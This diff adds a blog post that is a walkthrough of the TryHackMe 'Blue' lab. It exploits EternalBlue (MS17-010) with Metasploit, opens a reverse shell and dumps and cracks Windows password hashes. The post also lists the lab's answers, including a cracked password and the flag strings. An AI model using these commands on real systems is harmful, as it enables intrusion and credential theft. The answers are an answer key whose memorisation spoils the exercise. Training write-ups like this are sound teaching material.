@@ -1,0 +1,73 @@
+---
+layout: post
+title:  "[THM] Blue"
+date:   2021-02-05 11:47:08 +0200
+categories: THM
+---
+Let's have a look into the [Blue](https://tryhackme.com/room/blue) room in TryHack me, as it states in the opening statement, this is a beginners machine. Blue is based on a well-known windows vulnerability called Eternal Blue. You can read a bit more [here](https://en.wikipedia.org/wiki/EternalBlue). 
+
+Before starting remember to turn on the machine and connect to the VPN or start the attack box if you prefer.
+
+# Recon
+As suggested let's start by scanning ports on the machine to find open ports, run the command  ```sudo nmap -A -sS -p- IP -v```.
+
+![Nmap scan](/assets/images/posts/blue/nmap.jpg)
+
+* How many ports are open with a port number under 1000? **3**
+
+To scan for vulnerabilities we can use the vuln script on nmap, for this we can run ```sudo nmap IP --script vuln```
+![Nmap scan](/assets/images/posts/blue/vuln.jpg)
+
+* What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)  **ms17-010**
+
+*tip:* After getting such specific vulnerability you can run ```searchsploit ms17-010``` or inside msfconsole ```search ms17-010```. You can try to progress from this point without on your own.
+
+# Gain Access
+As we found the MS17-010 vulnerability, we will start Metasploit and search for it. 
+
+Open ```msfconsole``` and run ```search ms17-010```, note that you will find the exploit for different operating systems and also scanners to verify if the target system is vulnerable to the EternalBlue exploit.
+
+* Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........): **exploit/windows/smb/ms17_010_eternalblue**
+
+First select the exploit by ```use {# of exploit}``` or ```use exploit/windows/smb/ms17_010_eternalblue```. Now you can see all the options available by running the command ```options```, and to set any of them you can use ```set NAME VALUE```.
+
+* Show options and set the one required value. What is the name of this value? (All caps for submission): **RHOSTS**
+
+Let's go ahead and set a value for RHOST ```set RHOSTS THM_IP```, notice that we should also set a payload, ```set payload windows/x64/shell/reverse_tcp```, if you don't have it already, after that you can see the options available for it. 
+
+**Note:** Double-check the value of LHOSTS, it should display your VPN ip, if this is not the case modify it with the command: ```set LHOSTS YOUR_IP```.
+
+When you are ready, type ```run``` and wait to see if the exploit succeeds. You should be able to see a success message.
+![Successful exploit](/assets/images/posts/blue/run.jpg)
+
+**Note:** I was using the latest version of msfconsole and I got a meterpreter console already running as SYSTEM, but for reference here are the steps if it is not your case:
+
+* What is the name of the post module we will use?: **post/multi/manage/shell_to_meterpreter**
+* Select this (use MODULE_PATH). Show options, what option are we required to change? **session**
+* Set the required option, you may need to list all of the sessions to find your target here. -> Find your session by running session -l
+
+# Cracking
+
+Run the command ```hashdump``` and you will see a list of usernames and hashes.    
+![Hash dump](/assets/images/posts/blue/hashdump.jpg)
+What is the name of the non-default user? **Jon**
+
+Now we need to crack the password for the user Jon, let's pause the meterpreter session by pressing ```Ctrl-Z```, now we are going to use the  ```post/windows/gather/hashdump``` to get the hashes to Metaexploit database, to run this post-exploit tool you will need to set the session by ```set SESSION #``` and then you can run it by typing ```run```.
+
+To check the credentials stored in our database you can type the command ```cred```.
+
+![Credentials on database](/assets/images/posts/blue/creds.jpg) 
+
+You will see on the private column a that all the rows start with aad3b..., then there it is the actual hash you will need to copy, on this case for 'Jon' user it will be ffb43f0de35be4d9917ac0cc8ad57f8d, and you should crack it with your favorite tool.
+
+* What is the cracked password? **alqfna22**
+
+# Find flags!
+
+Let's finish the exercise by finding the different flags on the system, to resume your meterpreter session type ```sessions #```, then let's open a normal windows shell by typing ```shell```, the commands you need to find the flags are ```cd```, to change directory, ```dir```, to list the content of a directory, and ```type file``` to print in the console the content of a file.
+
+* Flag1? This flag can be found at the system root. **flag{access_the_machine}**
+* Flag2? This flag can be found at the location where passwords are stored within Windows. **flag{sam_database_elevated_access}**, located at ```C:\Windows\System32\config```
+* flag3? This flag can be found in an excellent location to loot. **flag{admin_documents_can_be_valuable}**, located at ```C:\Users\Jon\Documents```
+
+Hope you had fun on this machine, and see you at the next one!
